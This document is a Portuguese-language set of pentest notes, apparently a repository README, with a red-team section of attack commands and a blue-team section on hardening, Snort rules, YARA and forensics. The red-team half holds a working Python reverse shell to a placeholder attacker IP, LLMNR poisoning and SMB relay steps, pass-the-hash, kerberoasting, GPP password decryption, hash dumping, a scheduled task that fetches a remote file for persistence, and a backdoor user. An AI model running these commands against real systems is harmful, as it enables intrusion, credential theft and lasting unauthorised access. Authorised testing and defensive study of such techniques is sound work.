## ANOTACOES PARA PENTESTS  
> Aqui eu deixo algumas de minhas anotações uteis para blueteam e redteam, você vai encontrar Taticas Tecnicas e Procedimentos para ataque e defesa cibernetica.  


### Guias para pentests
> [dicas, truques e guias de campo]  

###### https://jivoi.github.io/2015/07/01/pentest-tips-and-tricks/  
###### https://jivoi.github.io/2015/08/21/pentest-tips-and-tricks-number-2/  
###### https://medium.com/@7a616368/ctf-methods-and-tool-92febcac2ff4  
###### https://book.hacktricks.xyz/  
###### https://medium.com/@7a616368/just-another-list-of-powershell-commands-cab14d564bc4  

### PLATAFORMAS DE BUGBOUNTY  
###### https://www.hackerone.com  
###### https://bugcrowd.com/  

### PADROES DE METODOLOGIA DE PENTEST  
###### PTES = http://www.pentest-standard.org/index.php/Main_Page  
###### OWASP = https://owasp.org/  
###### NIST = https://csrc.nist.gov/publications/detail/sp/800-115/final  
###### OSSTMM = https://www.isecom.org/OSSTMM.3.pdf  

### DESTAQUES  
###### BLUE TEAM = https://threathunterplaybook.com/introduction.html  
> [https://github.com/Cyb3rWard0g/HELK]  

###### RED TEAM = https://book.hacktricks.xyz/  
> [https://github.com/outflanknl/RedELK]  

###### MANUAL ASSEMBLY = https://software.intel.com/sites/default/files/managed/39/c5/325462-sdm-vol-1-2abcd-3abcd.pdf  


## REDTEAM  
#### COMANDOS UTEIS DO CMD:  
```
C:/> echo %cd%
C:/> rm /s path_name
C:/> dir /S file.txt
C:/> netstat -ntpl
C:/> tasklist
C:/> tasklist /SVC 
C:/> taskkill -pid PID_NUMBER
C:/> net user administrator
C:/> findstr /C:"password"
C:/> sc query windefend
C:/> netsh advfirewal show currentprofile
C:/> where /R c:\ arquivoQUEprocuro
C:/> whoami /groups
C:/> shutdown /r /t
C:/> execute -f notepad.exe
C:/> netsh wlan show profile
C:/> echo %LOGONSERVER%
C:/> nltest /dclist, nslookup -q=srv _kerberos._tcp
C:/> cmdkey /list
```

#### CABEÇALHOS EM SERVIDORES WEB:  
```
$ nc -v target.com 80
GET / HTTP/1.0
HEAD / HTTP/1.0
OPTIONS / HTTP/1.0
```

#### REVERSE SHELL PYTHON OS.DUP2:  

###### Maquina atacante:
```
$ sudo rlwrap nc -nvlp 443
```

###### Maquina vitima:
> Substitua o IP-DO-ATACANTE para o endereço ip da maquina offensiva.  
```
$ python -c 'import os,socket,subprocess;s=socket.socket();s.connect(("IP-DO-ATACANTE",443));os.dup2(s.fileno(), 0);os.dup2(s.fileno(), 1);os.dup2(s.fileno(), 2);p=subprocess.call(["/bin/sh","-i"]);'
```

#### POWERSHELL WEAPONS:
> Scripts uteis para varredura de rede.  

###### PING SWEEP:  
```
param($p1)
if(!$p1){
    Write-Output "Usage: .\pingsweep.ps1 192.168.0"
}else{
	Write-Output "Ping Sweep started !"
    foreach($ip in 1..254){
        try{ 
            $resp = ping -n 1 "$p1.$ip" | Select-String "bytes=32"
            $resp.Line.split(' ')[2] -replace ":",""
        }catch{}
    }
}
```

###### PORT SCANNING:  
```
param($ip)
if(!$ip){
    Write-Host ".\portscan.ps1 192.168.0.1"
}else{
	Write-Host "Port Scanning v1.0"
    $topports = 21,22,23,25,80,81,88,110,443,993,3306,5432
    try{
        forearch($port in $topports){
            if(Test-NetConnection $ip -Port $port -WarningAction SilentlyContinue -InformationLevel Quiet){
                Write-Host "Port $port Open"
            }}else{
                Write-Host "Port $port Closed"
            }} catch{}
}
```


###### WEB CRAWLER:  
```
$host = Read-Host "Enter the host address: "
$web = Invoke-WebRequest -uri $host -Method Options
    Write-Host "The server runing: "
        $web.headers.server
    Write-Host ""
    Write-Host "The server accept the methods: "
        $web.headers.allow
    Write-Host ""
Write-Host "Links founds: "
   $web2 = Invoke-WebRequest -uri $host
   $web2.links.href | Select-String http
```


#### O QUEIJO MAIOR EM UM AD
###### Ntds.dit localizado em:  
###### %SystemRoot%\NTDS  
###### Este arquivo é um banco de dados do AD  



#### LLMNR POISONING  
###### Orquestrando o ataque:  
```
$ sudo apt update
$ sudo apt install responder -y
$ sudo responder -I eth0 -rdwV
```

###### Quebrado NetNTLMv2:  
```
$ hashcat -m 5600 ntlmhash.txt rockyou.txt --force
```
###### OU  

```
$ hashcat64.exe -m 5600 ntlmhash.txt rockyou.txt -O
```


#### SMB RELAY  
###### Orquestrando o ataque:  
> Descobrindo os hosts da rede que possuem smb ativado:  
```
$ nmap --script=smb2-security-mode.nse -p445 192.168.0.0/24
```

> Procure pelo banner: Message signing enable but not required.  


###### Transmitindo crendenciais com responder e ntlmrelayx:  
```
$ pico /etc/responder/Responder.conf
```
```
SMB = Off
HTTP = Off
```
```
$ python responder.py -I eth0 -rdw -v
$ python ntlmrelayx.py -tf targets.txt -smb2support
```

###### Obtendo um shell interativo:  
```
$ python responder.py -I eth0 -rdw -v
$ python ntlmrelayx.py -tf targets.txt -smb2support -i

$ nc 127.0.0.1 11000
# help
```

###### OU:  
```
$ psexec.py Enterprise.local/alice:Password1@192.168.0.14
c:\> whoami
```
##### OU:  
```
$ wmiexec.py ENterprise.local/alice:Password1@192.168.0.14
$ smbexec.py Enterprise.local/alice:Password1@192.168.0.14
```
###### OU:  
```
$ git clone https://github.com/Hackplayers/evil-winrm
$ evil-winrm -i 192.168.0.14 -u alice -p Password1
```
###### OU:   
```
$ evil-winrm -i 192.168.0.14 -u alice -H 6a7df6as7df76dfa78af
```


#### IPV6 ATTACKS
###### MITM6:   
> [https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/]  

```
$ git clone https://github.com/fox-it/mitm6.git
$ pip install . 
```

###### Orquestrando o ataque:  
```
$ mitm6 -d Enterprise.local
$ ntlmrelayx.py -6 -t ldaps://192.168.0.14 -wh fakewpad.Enterprise.local -l lootme
$ cd lootme
```

#### POS-EXPLORAÇÃO
###### POWERVIEW:  
> [https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993]  
```
c:\> git clone https://github.com/PowerShellEmpire/PowerTools.git
c:\> cd PowerView

PS:\> powershell -ep bypass
PS:\> .\PowerView.ps1
```

###### Obtendo informacoes do AD DC:  
```
PS:\> Get-NetDomain
PS:\> Get-NetDomainController
PS:\> Get-DomainPolicy
PS:\> (Get-DomainPolicy)."system access"
```

###### Obtendo informacoes de contas de usuario:  
```
PS:\> Get-NetUser
PS:\> Get-UserProperty
PS:\> Get-UserProperty -Properties logoncount
PS:\> Get-UserProperty -Properties pwdlastset
PS:\> Get-UserProperty -Properties badpwdcount
```

###### Obtendo computadores do dominio:  
```
PS:\> Get-NetComputer
PS:\> Get-NetComputer -FullData
PS:\> Get-NetComputer -FullData | select OperatingSystem
```

###### Obtendo informacoes de grupos:  
```
PS:\> Get-NetGroup
PS:\> Get-NetGroup -GroupName *Admins*
PS:\> Get-NetGroupMember -GroupName "Domain Admins"
```

###### Obtendo informacoes de compartilhamento de rede:  
```
PS:\> Invoke-ShareFinder
```

###### Obtendo informacoes de GPOs:  
```
PS:\> Get-NetGPO
PS:\> Get-NetGPO | select displayname, whenchanged 
```

#### BLOODHOUND  
> [https://www.youtube.com/watch?v=DBx-AA9nOc0]  
> [https://www.100security.com.br/bloodhound]  
```
$ apt install bloodhound
$ neo4j console
```

###### Got to localhost:7474/browser  
```
$ bloodhound
```

###### Go to google: invoke-bloodhound  
> [https://github.com/BloodHoundAD/BloodHound/wiki]  
> [https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.ps1]  

###### Na rede alvo:
```
PS:\> powershell -ep bypass
PS:\> .\SharpHound.ps1 
PS:\> Invoke-BloodHound -CollectionMethod All -Domain Enterprise.local -ZipFileName file.zip
```
###### Go to BloodHound and upload file.zip



#### CRACKMAPEXEC
```
$ sudo apt install crackmapexec
```

###### Sprayattack:  
```
$ crackmapexec 192.168.0.0/24 -u alice -d Enterprise.local -p Password1 
$ crackmapexec 192.168.0.0/24 -u alice -d Enterprise.local -p Password1 --sam
$ psexec.py Enterprise/alice:Password1@192.168.0.100
C:\> whoami
```

###### Passando o hash:  
```
$ crackmapexec 192.168.0.0/24 -u "Alice Winchester" -h SegundaParteDoHash --local
$ psexec.py "Alice Winchester":@192.168.0.100 -hashes aa787sdf76asdf:76fasd6f7asd6f 
```

##### SECRETSDUMP:  
> [despejo de hashs]  
```
$ secretsdump.py Enterprise/alice:Password1@192.168.0.100
c:\> hashcat64.exe -m 1000 hashes.txt
```

#### KERBEROASTING
> [https://www.tarlogic.com/en/blog/how-to-attack-kerberos/]  
> [movimento vertical]  
```
$ GetUserSPNs.py Enterprise.local/alice:Password1 -dc-ip IP-DO-AD -request
$ hashcat --help | egrep Kerberos
$ hashcat -m 13100 hash.txt rockyou.txt --force
```

###### OU:  
```
$ python GetNPUsers.py Enterprise.local/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
$ cat hashes.asreproast
$ python GetNPUsers.py Enterprise.local/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
$ hashcat -m 18200 --force -a 0 hashes.asreproast
```

#### GPP ATTACK
```
$ smbclient -L \\\\10.10.10.100\\
$ smbclient \\\\10.10.10.100\\IPC$
smb:\> prompt off
smb:\> recurse on
smb:\> ls
Groups.xml

smb:\> mget *
```
> Pegue o valor do cpassword  
```
$ gpp-decrypt  cpassword-value
$ GetUserSPNs.py Enterprise.local/alice -dc-ip 10.10.10.100 -request
$ hashcat -m 13100 hash.txt rockyou.txt --force
$ psexec.py Enteprise.local/administrator:Password1@10.10.10.100
```

#### Roubo de informações no windows:  

###### getINFO.py  
```
import os

print '\n[*] DRIVES [*]'
print '\n[*] cdrom [*]'
os.system("wmic cdrom get caption,pnpdeviceid")
print '\n[*] hd [*]'
os.system("wmic logicaldisk get caption,drivetype,filesystem,freespace,mediatype,numberofblocks,size,volumename,systemname,supportsdiskquotas")
print '\n[*] printer [*]'
os.system("wmic printer get drivername,deviceid,network,local,EnableBIDI")
print '\n[*] audio [*]'
os.system("wmic SOUNDDEV get caption,creationclassname,systemname")
os.system("wmic SOUNDDEV get deviceid,manufacturer,name,productname")
print '\n[*] onboard [*]'
os.system("wmic ONBOARDDEVICE")
print '\n[*] ide [*]'
os.system("wmic IDECONTROLLER get caption,deviceid,status")
print '\n[*] SYSTEM [*]'
print '\n[*] os [*]'
os.system("wmic os get bootdevice,buildnumber,caption,locale,LocalDateTime,osarchitecture,version,PAEEnabled")
os.system("wmic os get encryptionlevel,installdate,lastbootuptime,FreePhysicalMemory,FreeSpaceInPagingFiles,LargeSystemCache ")
os.system("wmic qfe get caption,hotfixid,installedby,installedon")
os.system("wmic registry get name")
os.system("wmic csproduct get name")
os.system("wmic diskdrive get model")
os.system("wmic GROUP get caption,domain,sid,name,status,localaccount")
print '[*] bios [*]'
os.system("wmic bios get Biosversion,serialnumber,SMBIOSBIOSVersion")
print '[*] cpu [*]'
os.system("wmic cpu get l2cachespeed,l3cachespeed,maxclockspeed,caption,numberoflogicalprocessors")
os.system("wmic cpu get description,name,serialnumber,systemname,numberofcores,currentvoltage")
print '[*] network [*]'
os.system("wmic NICCONFIG get ipaddress")
os.system("wmic NICCONFIG get ipsubnet")
os.system("wmic NICCONFIG get caption,databasepath,dhcpenabled,ipenabled,macaddress,servicename")
os.system("wmic NICCONFIG get dnsdomain,dnshostname,dhcpserver")
os.system("wmic NeTlogin get caption,lastlogoff,lastlogon,homedirectory,fullname,profile,userid,usertype,privileges,maximumstorage")
print '\n[*] FEATURES [*]'
os.system("wmic RDNIC get terminalname,maximumconnections,NetworkAdapterList")
os.system("wmic RDACCOUNT get accountname,PermissionsAllowed,sid,terminalname")
print '\n[*] NATIVE [*]'
os.system("wmic service get pathname,state")
print '\n[*] DESKTOP [*]'
os.system("wmic desktop get wallpaper")
os.system("wmic desktopmonitor get screenheight,screenwidth")
print '\n[*] LOCATION [*]'
os.system("wmic timezone get description")
print '\n[*] PATHS [*]'
os.system("wmic share")
os.system("wmic ENVIRONMENT get variablevalue")
os.system("wmic startup get location,name,user")
os.system("wmic PARTITION get name,bootpartition,bootable,blocksize,description,hiddensectors,numberofblocks,primarypartition,index,size")
os.system("wmic PAGEFILE")
#domain inative'
#os.system("wmic NTDOMAIN get Caption,ClientSiteName,CreationClassName,DcSiteName,DnsForestName,DomainControllerAddress,DomainControllerAddressType,DomainControllerName,DomainGuid,DomainName,DSDnsControllerFlag,DSDnsDomainFlag,DSDnsForestFlag,DSKerberosDistributionCenterFlag,DSPrimaryDomainControllerFlag,DSTimeServiceFlag,DSWritableFlag,InstallDate,Name,PrimaryOwnerContact,PrimaryOwnerName,Status")
```

#### MANTENDO ACESSO  
###### Script persistentes:  
```
meterpreter> run persistense -h
msf> use exploit/windows/local/persistence
msf> use exploit/windows/local/registry_persistence
```
###### Agendando tarefas:  
```
meterpreter> run scheduleme
meterpreter> run schtaskabuse
```
###### Agendando tarefa via cmd:
> CRIAR:  
```
schtasks.exe /create /sc minute /tn light-pixel_0xA3 /tr "cmd.exe /c powershell wget http://192.168.15.16/agendador.txt -O %USERPROFILE%/desktop/agendador.txt"
```
> DELETAR:  
```
schtasks.exe /delete /tn light-pixel_0xA3 
```
###### Adicionando um usuario:
```
net user hacker passwrod123 /add
```

#### ESCALAÇÃO DE PRIVILEGIOS  
###### Windows exploit suggester:  
```
C:\> systeminfo > sysinfo.txt
$ curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py; python get-pip.py
$ pip install python-xlrd ; pip install xlrd --upgrade
$ git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git
$ ./windows-exploit-suggester.py --update
$ ./windows-exploit-suggester.py --database 2020-04-17-mssb.xls --systeminfo sysinfo.txt
```


## BLUETEAM  
#### Desativando listagem de diretorio apache2:  
```
$ vi /etc/apache2/apache2.conf  #REMOVER O 'Options Indexes FollowSymLinks' para 'Options FollowSymLinks'
$ service apache2 restart
```

#### R emovendo versao do apache2 em mensagens 404:  
```
$ pico /etc/apache2/conf-enabled/security.conf # REMOVER 'ServerTokens OS' para 'ServerTokens Prod'
$ pico /etc/apache2/conf-enabled/security.conf # REMOVER 'ServerSignature On' para 'ServerSignature Off'
```

#### SNORT  
> [https://resources.infosecinstitute.com/search/?s=snort]  
```
$ apt-get install snort
$ cd /etc/snort/
$ snort -A fat -q -h 192.168.0.0/24 -c snort.conf
$ cd /var/log/snort
$ tail -f alert
```
###### OU:  
```
$ snort -A console -q -h 192.168.0.0/24 -c snort.conf
```

###### CRIANDO REGRAS:  
> [https://paginas.fe.up.pt/~mgi98020/pgr/writing_snort_rules.htm#rule_options]  
> [https://resources.infosecinstitute.com/snort-session-sniping-with-flexresp/]  
```
$ pico /etc/snort/rules.rules
```
```
alert tcp any any -> 192.168.15.15 any (msg:"Alerta perigo will robson !";sid:1000001;rev:001;)
alert tcp any any -> 192.168.15.15 80 (msg:"Acesso ao arquivo robots !";content:"robots.txt";sid:1000002;rev:001;)
alert tcp any any -> 192.168.15.15 any (msg:"Alerta perigo will robson !";sid:1000003;rev:001;)
alert tcp any any -> 192.168.15.15 443 (msg:"Intruso !";content:"admin.php";sid:1000004;rev:001;)
alert tcp any any -> 192.168.15.15 any (msg:"Ataque de SQL INJECTION";content:"%27";sid:1000005;rev:001;)
alert tcp any any -> 192.168.15.15 any (msg:"Alerta perigo will robson !";sid:1000006;rev:001;)
alert tcp any any -> 192.168.15.15 22 (msg:"SSH Brute Force Attack !";flow:to_server;flags:S;threshold:type threshold, track by_src, count 3, seconds 60;classtype:attempted-dos;sid:1000007;rev:4; resp:rst_all;)
```
```
$ nano /etc/snort/snort.conf
```
```
include $RULE_PATH/rules.rule
```
```
$ service snorte restart
```


#### PORTSENTRY E O LOGSENTRY  
> [http://etutorials.org/Linux+systems/red+hat+linux+bible+fedora+enterprise+edition/Part+III+Administering+Red+Hat+Linux/Chapter+14+Computer+Security+Issues/Guarding+Your+Computer+with+PortSentry/]  
> [http://etutorials.org/Linux+systems/red+hat+linux+bible+fedora+enterprise+edition/Part+III+Administering+Red+Hat+Linux/Chapter+14+Computer+Security+Issues/Monitoring+Log+Files+with+LogSentry/]  

###### LInks:  
> http://cesarakg.freeshell.org/portsentry-ptBR.html  
> https://www.vivaolinux.com.br/artigo/PortSentry-Melhorando-a-seguranca-do-seu-Linux  
> https://sourceforge.net/projects/sentrytools/  
> https://manpages.debian.org/testing/portsentry/portsentry.8.en.html  
> https://www.linuxjournal.com/article/4751  

###### Bloqueio de portscan firewall:  
```
$ apt-get install portsentry
$ pico /etc/portsentry/portsentry.conf
$ portsentry -stcp
```


#### YARA  
```
$ tar -zxf yara-3.11.0.tar.gz
$ cd yara-3.11.0
$ ./bootstrap.sh
$ sudo apt-get install automake libtool make gcc pkg-config
$ ./configure
$ make
$ sudo make install
$ make check
$ curl -o Desktop/sample.yar https://raw.githubusercontent.com/VirusTotal/yara/master/sample.rules
$ yara [OPTIONS] sample.yar /*
```

###### Repositorios de regras:  
> https://github.com/Neo23x0/yarGen  
> https://github.com/VirusTotal/yara/  
> https://github.com/InQuest/awesome-yara  
> https://github.com/Xumeiquer/yara-forensics  
> https://github.com/ZephrFish/Random-Yara-Rules  

#### Mitigando ataque LLMNR POISONING  
> A melhor defesa e desativar o LLMNR e o NBT-NS  

###### LLMNR:  
```
Selecione "Turn OFF Multicast Name Resolution" under Local Computer Policy > Computer Configuration > Administrative Templates > Network > DNS Client in the Group Policy Editor.
```
###### NBT-NS:  
```
Navigate to Network Connections > Network Adapter Properties > TCP/IPv4 Properties > Advanced tab > WINS tab and select "Disable NetBIOS over TCP/IP"

Se isso nao for possivel ou viavel, criar politica de controle de acesso baseado em endereço MAC
Criar politica de senha complexas e maiores de 14 caracteres
```

#### Mitigação de ataques a SMB RELAY  
> Ativar assinatura smb em todos os dispositivos.  
```
Desativar autenticação NTLM via rede.
Restrição de admin local.
```



#### FORENSE  
##### Coleta de dados volateis windows:  
###### Coleta de memoria ram:  
```
c:\> MDD = coleta o dump da memoria ram do sistema
c:\> Win32dd = coleta o dump da memoria ram do sistema
c:\> DumpIT = coleta o dump da memoria ram do sistema
```

###### Coleta de informacoes do sistema:  
```
c:\> time /t = coleta a hora do sistema
c:\> date /t = coleta a data do sistema
c:\> systeminfo = coleta informacoes do sistema
c:\> sfc = busca arquivos danificados no sistema
c:\> ipconfig /all = coleta informacoes de rede
c:\> netstat -an = coleta informacoes de conexao de rede
c:\> driverquery = coleta informacoes de drivers de dispositivos instalados
c:\> reg QUERY /? = coleta informacoes e chaves do registro do sistema
c:\> tasklist = coleta processos e execucao
c:\> hostname = coleta o nome da maquina
c:\> route PRINT = coleta informacoes da tabela de rota
c:\> set = coleta todas as variaveis de ambiente do sistema
c:\> tree = exibe a arvore de pastas e subpastas do sistema
c:\> ver = coleta a versao do sistema
c:\> vol = coleta informacoes do drive de armazenamento
c:\> getmac = coleta o mac-address do sistema
```

######  Coleta com PsTools do pacote SYSINTERNALS:  
```
c:\> PsLoggedon = coleta informacoes de usuarios logados no sistema
c:\> Psfile = coleta informacoes de arquivos abertos remotamente
c:\> Psgetsid = coleta o s-i-d do sistema
c:\> Psinfo = coleta informacoes do sistema
c:\> Pspasswd = altera as senhas de um usuario do sistema
c:\> Psservices = coleta informacoes de todos o servicos do sistema
c:\> Psloglist = coleta todos os logs do sistema 
c:\> LogonSessions = coleta todas as informacoes de sessao do sistema
```

##### Coleta de dados volateis linux:  
###### Coleta de memoria ram:  
```
root@pericia:/# dd if=/dev/mem of=/dev/perito_device/data_da_coleta__numero_do_caso01.vmen 
root@pericia:/# memdump > /mnt/perito_device/data_da_coleta__numero_do_caso02.vmem
root@pericia:/# cat /dev/mem > /mnt/perito_device/data_da_coleta__numero_do_caso03.vmem
```

###### Coleta de informacoes do sistema:  
```
root@pericia:/# htop ---> visualizador de processos com grafico
root@pericia:/# uname -a = colete informacoes do sistema
root@pericia:/# fdisk -l = coleta informacoes de dispositivos de armazenamento conectados na maquina
root@pericia:/# lsblk = coleta informacoes de dispositivos de armazenamento conectados na maquina (semelhante a fdisk)
root@pericia:/# ps -aux = coleta todos os processos abertos na maquina
root@pericia:/# pstree = coelta os processos em forma de arvore
root@pericia:/# w = coleta os usuarios conectados no sistema
root@pericia:/# history = coleta o historico de comandos 
root@pericia:/# free -m = coleta informacoes da memoria volatil do sistema
root@pericia:/# lspci = coleta informacoes de hardware da maquina
root@pericia:/# lsusb = coleta informacoes de dispositivos usb
root@pericia:/# last = coleta informacoes de login no sistema
root@pericia:/# uptime = coleta informacoes de tempo de execucao do sistema
root@pericia:/# dpkg -l = coleta todos os pacotes instalados no sitema
root@pericia:/# top = coleta informacoes de processos rodando na maquina
root@pericia:/# unhide = coleta processos ocultos no sistema
root@pericia:/# unhide-tcp = coleta conecoes tcp ocultas no sistema
root@pericia:/# unhide-posix = coleta conecoes ocultas no sistema
root@pericia:/# date = coleta a data do sistema
root@pericia:/# df -Th = coleta informacoes das particoes do sistema
root@pericia:/# mount = coleta informacoes dos pontos de montagem do sistema
root@pericia:/# ifconfig -a = coleta informacoes de rede
root@pericia:/# route -n = coleta informacoes da tabela de rota do sistema
root@pericia:/# lsmod = coleta os modulos ativos no sistema
root@pericia:/# lsof = coleta informacoes de arquivos abertos
root@pericia:/# strace -c du /root = coleta as chamadas do sistema e as sinaturas
root@pericia:/# readelf -hSle = coleta as informacoes de um arquivo binario (elf)
root@pericia:/# ldd = coleta as informacoes das bibliotecas de um arquivo binario (elf) 
root@pericia:/# nm = coleta as informacoes de secoes de um programa executado
root@pericia:/# objdump -Dsx = exibi informacoes assembly de um arquivo binario
root@pericia:/# lsattr = coleta informacoes de atributos de um arquivo
root@pericia:/# dd = efetua copias bit-a-bit  
root@pericia:/# dcfldd = efetua copias bit-a-bit e efetua calculo de hash
```

#### THE SLEUTH KIT

```
root@pericia:/# mmls 4linux01.dd = mostra o esborço de uma particao
root@pericia:/# disktype 4linux01.dd = exibe o tipo de sistema de arquivos de uma imagem de disco
root@pericia:/# fsstat -f fat -o 62 4linux01.dd = mostra os detalhes gerais de um sistema de arquivo
root@pericia:/# ifind -f fat -o 62 -d 10000 4linux01.dd = encontra um inode pelo bloco de disco
root@pericia:/# ffind -f fat -o 62 <resultado_ifind> 4linux01.dd = busca o arquivo do inode fornecido
root@pericia:/# istat -o 62 <resultado_ifind> 4linux01.dd = mostra os detalhes de uma estrutura de metadados
root@pericia:/# fls -ro 62 4linux01.dd = lista os arquivos e diretorios de uma imagem de disco
root@pericia:/# icat -o 62 4linux01.dd <numero_do_inode> = retorna o conteudo de um arquivo pelo inode
root@pericia:/# sigfind -f fat 4linux01.dd = encontra a assinatura binaria em um arquivo
root@pericia:/# mmstat 4linux01.dd = mostra o detalhe sobre volimes do sistema
root@pericia:/# ils -o 62 4linux01.dd = mostra lista informacoes do inode
root@pericia:/# img_stat 4linux01.dd = mostra detalhes de uma imagem de disco
root@pericia:/# img_cat 4linux01.dd | strings -a > img_cat_4linux01.txt = retorna o centeudo de um arquivo de imagem
root@pericia:/# tsk_gettimes 4linux01.dd = retorna informacoes dos arquivos de uama imagem de disco
root@pericia:/# tsk_comparedir -o 62 4linux01.dd  /tmp = compara um arquivo de imagem com otro arquivo 
root@pericia:/# tsk_loaddb 4linux01.dd = transforma uma imagem de disco em um dump.db 
root@pericia:/# tsk_recover 4linux01.dd = exporta os arquivos de uma imagem de disco para um diretorio local
root@pericia:/# srch_strings 4linux01.dd = retorna os caracteres imprimiveis de uma imagem de disco
root@pericia:/# hashdeep -r 4linux01.dd = cria hashs de um ou mais arquivos
root@pericia:/# hfind -i md5sum hashs.md5 = consulta um halor de hash em uma base de dados de hash
root@pericia:/# blkls -o 62 4linux01.dd = lista unidade de blocos do sistema de arquivos
root@pericia:/# mac-robber /diretorio= retorna os mactimes de um diretorio
root@pericia:/# foremost/scalpel = recupera arquivos atraves dos numeros magicos
root@pericia:/# diff arquivo1 arquivo2 = compara diferenças entre dois arquivos
```

#### TCT - THE CORONELS TOOLKIT  

###### O TCT apresenta quatro partes principais:  
```
1- grave-robber;
2- mactime;
3- utilitarios (icat,ils,pcat,md5,timeout);
4- unrm e lazarus;
```
```
root@pericia:/# grave-robber -c / -m -d . -o LINUX2 = captura diversos dados por ordem de volatilidade e cria hashs md5 
root@pericia:/# mac-robber /diretorio > relatorio.mac_robber = gera arquivo de mactimes para o comando mactimes
root@pericia:/# mactimes -b relatorio.mac_robber = gera os mactimes do arquivo de saida do mac-robber
```

#### ANALISE DE MEMORIA RAM  
```
root@pericia:/# volatility -f 4linux02.vmem imageinfo
root@pericia:/# volatility -f 4linux02.vmem kdbgscan
root@pericia:/# volatility -f 4linux02.vmen --profile=PROFILE pslist = lista os processos em execuçao
root@pericia:/# volatility -f 4linux02.vmen --profile=PROFILE pstree = mostra todos os processos em arvore
root@pericia:/# volatility -f 4linux02.vmen --profile=PROFILE psscan = escanea os processo
root@pericia:/# volatility -f 4linux02.vmen --profile=PROFILE psxview = procura processos escondidos
root@pericia:/# volatility -f 4linux02.vmen --profile=PROFILE connections = lista as conexoes abertas
root@pericia:/# volatility -f 4linux02.vmen --profile=PROFILE connscan = exibe conecoes recentes
root@pericia:/# volatility -f 4linux02.vmen --profile=PROFILE malfind -pNUM_PID = exibe codigos ocultos
root@pericia:/# volatility -f 4linux02.vmem --profile=PROFILE procdump -pNUM_PID -D /tmp = realiza dump de processos
root@pericia:/# volatility -f 4linux02.vmem --profile=PROFILE handles -t Mutant -p NUM_PID -s = exibe lista de identificador de um processo 
root@pericia:/# volatility -f 4linux02.vmem --profile=PROFILE filescan = escanea arquivos encontrados
root@pericia:/# volatility printkey -f 4linux02.vmem --profile=PROFILE -K 'Software\Microsoft\CurrentVersion\Run' = exibe a versao corrente do sistema
root@pericia:/# volatility -f 4linux02.vmem --profile=PROFILE sockets = exibe uma lista de sockets abertos
root@pericia:/# volatility -f 4linux02.vmem --profile=PROFILE sockscan = scaneia soquetes dos objetos 
root@pericia:/# volatility -f 4linux02.vmem --profile=PROFILE getsids = exibe os SID's de cada processo
root@pericia:/# volatility -f 4linux02.vmem --profile=PROFILE dlllist = exibe as dlls carregadas pra cada processo
root@pericia:/# volatility -f 4linux02.vmem --profile=PROFILE filescan >> filescan = exibe o offset de cada arquivo presente na memoria
root@pericia:/# volatility -f 4linux02.vmem --profile=PROFILE dumpfiles -Q offset_do_filescan -D dumpfiles/ -u -n -S summary.txt = recupera o arquivo presente na memoria.
```

#### ESTEGANOGRAFIA  
```
root@pericia:/# steghide embed -cf picture.jpg -ef msg_secret.txt -p p4ssw0rd
root@pericia:/# steghide --info picture_embed.jpg
root@pericia:/# steghide extract -sf picture_embed.jpg -p p4ssw0rd
root@pericia:/# outguess -k "p4ssw0rd" -d msg_secret.txt picture.jpg picture_embed.jpg
root@pericia:/# outguess -k "p4ssw0rd" -r picture_embed.jpg data_extract.txt
root@pericia:/# apt install zbar-tools
root@pericia:/# zbarimg QueryCode.png
root@pericia:/# gem install zsteg
root@pericia:/# zsteg -a img.png
```

